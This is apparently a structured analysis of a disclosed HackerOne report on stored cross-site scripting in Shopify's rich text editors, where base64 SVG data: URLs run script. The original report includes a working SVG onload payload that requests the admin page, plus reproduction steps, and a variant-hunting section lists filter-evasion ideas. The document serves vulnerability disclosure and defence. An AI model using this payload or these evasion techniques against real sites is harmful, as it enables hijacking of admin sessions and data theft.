# Stored XSS in SVG file as data: URL in Rich Text Editors

## Metadata
- **Source:** HackerOne
- **Report:** 1276742 | https://hackerone.com/reports/1276742
- **Submitted:** 2021-07-24
- **Reporter:** irisrumtub
- **Program:** Shopify
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Stored Cross-Site Scripting (XSS), Unsafe Data URL Handling, SVG-based Code Execution
- **CVEs:** None
- **Category:** web-api

## Summary
Shopify's rich text editors (products, gifts, pages) allow data: URLs as image sources, enabling attackers to store malicious SVG payloads with embedded JavaScript. When users open the embedded image, the JavaScript executes in the admin context, allowing unauthorized access to /admin endpoints and potential data exfiltration.

## Attack scenario
1. Attacker crafts malicious SVG with onload event handler containing XMLHttpRequest code
2. SVG is base64 encoded and embedded as data: URL in img src attribute
3. Attacker stores this HTML in product description or other rich text fields via form submission
4. Malicious content is persisted in database and rendered to other users
5. When victim opens/clicks the image, onload event fires and JavaScript executes
6. JavaScript makes authenticated requests to /admin endpoints with victim's session credentials

## Root cause
Insufficient input validation and sanitization of data: URLs in rich text editors. The application failed to prevent execution of JavaScript within SVG elements embedded via data URIs, and did not restrict access to sensitive admin endpoints from user-controlled script contexts.

## Attacker mindset
An attacker could leverage this to conduct account takeover, steal admin session data, modify products/orders, or escalate privileges by injecting malicious SVG payloads into commonly-viewed product pages. The stored nature amplifies impact as the payload persists and affects multiple users.

## Defensive takeaways
- Implement strict Content Security Policy (CSP) headers to restrict script execution from data: URLs
- Sanitize and validate all user-supplied HTML, specifically blocking data: URLs or whitelisting only safe image protocols (http, https)
- Use an HTML sanitizer library (e.g., DOMPurify) configured to strip dangerous SVG attributes like onload, onerror
- Implement server-side validation to reject data: URLs entirely if not needed for legitimate use cases
- Apply origin-based CSRF protections and SameSite cookie attributes to prevent cross-origin script access to admin endpoints
- Audit all rich text editor implementations across the platform for similar data: URL injection points
- Consider using iframe sandboxing to isolate rendered user content

## Variant hunting
Search for other data: URL injection points in file upload/image handling features
Test rich text editors in all modules (pages, collections, customers, orders) for similar bypasses
Investigate if other SVG event handlers (onerror, onmouseover) can bypass current filters
Check if script: protocol or javascript: protocol URLs are filtered but data: URLs are not
Look for similar patterns in third-party WYSIWYG editors integrated with Shopify
Test nested/encoded variations (double encoding, Unicode escapes) to evade filters
Check if SVG XLink href attributes can be abused similarly

## MITRE ATT&CK
- T1190
- T1598
- T1566
- T1204
- T1539
- T1552

## Notes
The vulnerability is particularly dangerous because: (1) it's stored, affecting multiple users; (2) it executes in admin context with elevated privileges; (3) the base64 encoding may evade basic XSS filters; (4) SVG handling is often overlooked in security reviews. The attacker demonstrated actual impact by making XMLHttpRequest to admin panel, proving code execution capability rather than theoretical XSS.

## Full report
<details><summary>Expand</summary>

Hi Shopify team, 

In rich text editors (products, gifts, pages, etc) you allow *data:*  URLs to be set as image sources, and I was able to store XSS in such image. While <img> won't execute script that is stored inside the SVG it points to, if one opens the image, the script will be executed. What is important here is that you actually can use javascript here to access /admin area.

#Steps to reproduce:
1. Create a product with such html description:
```html
<img src="data:image/svg+xml;base64," alt="">
```
Inside this base 64 is code like this:

```html
<svg onload="var req = new XMLHttpRequest(); req.open('GET', 'https://us-based-organization-h1.myshopify.com/admin', false); req.setRequestHeader('Upgrade-Insecure-Requests', '1');req.setRequestHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36') ;req.send(null);var headers = req.response.toLowerCase();console.log(headers);" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 100 100" enable-background="new 0 0 100 100" xml:space="preserve" height="100px" width="100px">
<g>
	<path d="M28.1,36.6c4.6,1.9,12.2,1.6,20.9,1.1c8.9-0.4,19-0.9,28.9,0.9c6.3,1.2,11.9,3.1,16.8,6c-1.5-12.2-7.9-23.7-18.6-31.3   c-4.9-0.2-9.9,0.3-14.8,1.4C47.8,17.9,36.2,25.6,28.1,36.6z"/>
	<path d="M70.3,9.8C57.5,3.4,42.8,3.6,30.5,9.5c-3,6-8.4,19.6-5.3,24.9c8.6-11.7,20.9-19.8,35.2-23.1C63.7,10.5,67,10,70.3,9.8z"/>
	<path d="M16.5,51.3c0.6-1.7,1.2-3.4,2-5.1c-3.8-3.4-7.5-7-11-10.8c-2.1,6.1-2.8,12.5-2.3,18.7C9.6,51.1,13.4,50.2,16.5,51.3z"/>
	<path d="M9,31.6c3.5,3.9,7.2,7.6,11.1,11.1c0.8-1.6,1.7-3.1,2.6-4.6c0.1-0.2,0.3-0.4,0.4-0.6c-2.9-3.3-3.1-9.2-0.6-17.6   c0.8-2.7,1.8-5.3,2.7-7.4c-5.2,3.4-9.8,8-13.3,13.7C10.8,27.9,9.8,29.7,9,31.6z"/>
	<path d="M15.4,54.7c-2.6-1-6.1,0.7-9.7,3.4c1.2,6.6,3.9,13,8,18.5C13,69.3,13.5,61.8,15.4,54.7z"/>
	<path d="M39.8,57.6C54.3,66.7,70,73,86.5,76.4c0.6-0.8,1.1-1.6,1.7-2.5c4.8-7.7,7-16.3,6.8-24.8c-13.8-9.3-31.3-8.4-45.8-7.7   c-9.5,0.5-17.8,0.9-23.2-1.7c-0.1,0.1-0.2,0.3-0.3,0.4c-1,1.7-2,3.4-2.9,5.1C28.2,49.7,33.8,53.9,39.8,57.6z"/>
	<path d="M26.2,88.2c3.3,2,6.7,3.6,10.2,4.7c-3.5-6.2-6.3-12.6-8.8-18.5c-3.1-7.2-5.8-13.5-9-17.2c-1.9,8-2,16.4-0.3,24.7   C20.6,84.2,23.2,86.3,26.2,88.2z"/>
	<path d="M30.9,73c2.9,6.8,6.1,14.4,10.5,21.2c15.6,3,32-2.3,42.6-14.6C67.7,76,52.2,69.6,37.9,60.7C32,57,26.5,53,21.3,48.6   c-0.6,1.5-1.2,3-1.7,4.6C24.1,57.1,27.3,64.5,30.9,73z"/>
</g>
</svg>
```
In this example i request my shop's admin page and in the video it looks like CORS is okay with it.

2. Open the resulting image in new tab and observe script execution in console.

#POC video:
█████

## Impact

With little user interaction we can execute arbitrary scripts in victim's account.

</details>

---
*Analysed by Claude on 2026-05-12*
